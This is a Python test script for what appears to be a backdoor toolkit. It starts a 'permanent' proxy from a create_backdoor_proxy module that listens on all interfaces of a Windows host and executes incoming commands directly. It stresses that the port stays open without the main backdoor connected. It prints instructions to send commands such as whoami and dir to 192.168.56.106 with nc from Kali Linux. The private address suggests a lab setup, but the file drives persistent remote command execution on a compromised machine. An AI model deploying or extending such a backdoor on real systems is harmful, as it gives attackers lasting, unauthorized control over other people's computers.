#!/usr/bin/env python3
"""
Test script for permanent proxy functionality
This demonstrates the simple approach where the Windows proxy port stays open permanently
"""

import sys
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from features.proxy import create_backdoor_proxy
import time

def main():
    print("=== Testing Permanent Proxy Implementation ===")
    
    # Create proxy manager
    proxy_mgr = create_backdoor_proxy()
    
    # Initialize proxy
    print("1. Initializing proxy...")
    success, msg = proxy_mgr.initialize_proxy()
    print(f"   Result: {msg}")
    
    if not success:
        print("Failed to initialize proxy!")
        return
    
    # Get initial status
    status = proxy_mgr.get_proxy_status()
    listen_port = status['proxy']['listen_port']
    print(f"\n2. Proxy configuration:")
    print(f"   Listen Port: {listen_port}")
    print(f"   Mode: Direct Command Execution")
    print(f"   Port Status: {status['port_status']}")
    
    # Start proxy
    print(f"\n3. Starting permanent proxy...")
    success, msg = proxy_mgr.start_proxy_operations()
    print(f"   Result: {msg}")
    
    if success:
        # Get running status
        status = proxy_mgr.get_proxy_status()
        actual_port = status['proxy']['listen_port']
        
        print(f"\n4. Proxy is now PERMANENTLY running:")
        print(f"   Listening on: 0.0.0.0:{actual_port}")
        print(f"   Status: {status['proxy']['is_running']}")
        print(f"   This port stays open even without backdoor.py connection!")
        
        print(f"\n5. Test connection instructions:")
        print(f"   From Kali Linux, run:")
        print(f"   echo 'whoami' | nc 192.168.56.106 {actual_port}")
        print(f"   echo 'dir' | nc 192.168.56.106 {actual_port}")
        print(f"   echo 'hostname' | nc 192.168.56.106 {actual_port}")
        
        print(f"\n6. Keeping proxy running indefinitely...")
        print(f"   Press Ctrl+C to stop")
        
        try:
            while True:
                time.sleep(5)
                # Show periodic status
                status = proxy_mgr.get_proxy_status()
                uptime = status['proxy']['uptime_seconds']
                connections = status['proxy']['active_connections']
                total = status['proxy']['total_connections']
                print(f"   [Status] Uptime: {uptime:.1f}s | Active: {connections} | Total served: {total}")
                
        except KeyboardInterrupt:
            print(f"\n\n7. Stopping proxy...")
            success, msg = proxy_mgr.stop_proxy_operations()
            print(f"   Result: {msg}")
    
    print("Test completed!")

if __name__ == "__main__":
    main()